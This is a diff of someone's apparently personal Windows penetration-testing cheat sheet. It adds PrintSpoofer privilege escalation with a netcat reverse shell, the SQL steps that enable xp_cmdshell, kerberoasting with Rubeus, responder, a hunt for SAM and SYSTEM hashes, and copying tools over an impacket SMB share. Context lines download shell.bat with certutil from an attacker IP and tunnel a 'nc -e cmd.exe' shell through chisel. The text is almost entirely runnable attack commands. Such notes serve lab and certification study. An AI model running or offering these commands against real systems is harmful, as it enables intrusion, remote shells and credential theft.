@@ -1,4 +1,4 @@
-* Enumm Enumm Enumm!
+f* Enumm Enumm Enumm!
 
 $ ipcondig /all
 $ arp -a
@@ -98,6 +98,8 @@ impacket, getnpusers.py
 impacket smbserver
 
 * SeImpersonate and SeAssignPrimary Token
+$ printspoofer.exe -i -c cmd OR
+$ printspoofer.exe -i -c "C:\Temp\nc.exe -e cmd.exe IP port"
 Connecting with MSSQLClient.py
 $ mssqlclient.py sqluser@ipadd -windows-auth
 SQL> enable_xp_cmdshell
@@ -164,7 +166,6 @@ $ .\lasagne.exe all
 $ certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
 $ certutil -encode file1 encodedfile
 $ certutil -decode encodedfile file2
-
 
 * Bloodhound Checks:
 pwn user 
@@ -236,10 +237,29 @@ win1 : chisel client yourip:8001 0.0.0.0:9000:yourip:99 -> tunnel to port 99
 kali : nc -nvlp 99
 win2 : nc -nv ipwin1 9000 -e cmd.exe
 
+file transfer by smbserver:
+(on kali) impacket-smbserver share $(pwd) -smb2support
+				it means: the our smb share is \\kali-ip\share
+(on xp_cmdshell) EXEC xp_cmdshell 'copy \\10.10.14.5\share\PrintSpoofer.exe C:\Users\Public\ps.exe';
+
 * privesc wins:
-whoami /priv (juicy potato/rogue potato)
-winpeas
-powerup
+$ whoami /priv
+$ winpeas.exe
+$ powerup
+$ cd C:\Users
+$ cd C:\windows.old\windows\system32 (find SAM and SYSTEM) if any
+$ responder en0tun
+$ rubeus.exe kerberoast /outfile:hashes.kerberoast
+$ rubeus.exe kerberoast /user:username /nowrap
+
+* xp_cmdshell in mssqlclient:
+xp_cmdshell activated:
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+
 
 * path traversal vuln:
 ../../../../../../../../../............
